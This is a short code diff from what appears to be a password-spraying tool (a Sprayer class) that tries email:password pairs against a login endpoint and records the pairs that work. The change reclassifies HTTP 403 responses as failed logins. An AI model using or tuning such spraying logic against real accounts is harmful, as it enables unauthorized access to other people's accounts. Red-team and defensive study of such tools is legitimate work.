@@ -103,14 +103,11 @@ class Sprayer:
             response = self._send_request(requests.options, url, auth=auth, headers=headers)
             status   = response.status_code
 
+            # Note: 403 responses no longer indicate that an authentication attempt was valid, but now indicates
+            #       invalid authentication attempts (whether it be invalid username or password). 401 responses
+            #       also indicate an invalid authentication attempt
             if status == 200:
                 print("[%sVALID_CREDS%s]\t\t%s:%s%s" % (text_colors.green, text_colors.reset, email, password, self.helper.space))
-                self.valid_creds.append('%s:%s' % (email, password))
-                self.userlist.remove(user)  # Remove valid user from being sprayed again
-
-            elif status == 403:
-                msg = password + " (Manually confirm [MFA, Locked, etc.])"
-                print("[%sFOUND_CREDS%s]\t\t%s:%s%s" % (text_colors.green, text_colors.reset, email, password, self.helper.space))
                 self.valid_creds.append('%s:%s' % (email, password))
                 self.userlist.remove(user)  # Remove valid user from being sprayed again
 
